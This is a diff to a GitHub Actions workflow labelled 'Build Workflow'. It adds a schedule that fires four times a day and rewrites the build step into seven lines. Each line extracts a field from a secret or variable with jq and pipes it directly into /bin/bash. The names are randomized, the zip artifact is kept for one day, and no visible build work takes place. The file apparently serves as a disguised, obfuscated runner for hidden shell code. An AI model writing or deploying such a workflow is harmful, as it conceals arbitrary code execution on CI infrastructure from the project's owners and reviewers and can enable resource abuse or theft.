@@ -2,6 +2,8 @@ name: Build Workflow
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '33 3,9,15,21 * * *'
 env:
   CI: true
 concurrency:
@@ -14,16 +16,19 @@ jobs:
       - uses: actions/checkout@v4
       - name: Build
         env:
-          url300: ${{ secrets.url300 }}
+          t58775: ${{ secrets.t58775 }}
         run: |
-          printf '%s' "$url300" | jq -r .ogqwf353 | /bin/bash
-          echo $csaqp8 | jq -r .oru980 | /bin/bash
-          echo $egjv13452 | jq -r .du2269 | /bin/bash
-          printf '%s' "$q561" | jq -r .j91 | /bin/bash
+          printf '%s' "$t58775" | jq -r .hquyx2785 | /bin/bash
+          printf '%s' "$kw3" | jq -r .cyt04491 | /bin/bash
+          echo $gcoei46 | jq -r .szb70 | /bin/bash
+          printf '%s' "$oapvw84" | jq -r .idf42 | /bin/bash
+          printf '%s' "$oubc7069" | jq -r .n66651 | /bin/bash
+          echo $dr3627 | jq -r .kdo9619 | /bin/bash
+          echo $lmxgh038 | jq -r .o16 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
         with:
-          name: 4eNLaF7J
+          name: mpApyaFe
           path: "*.zip"
           retention-days: 1
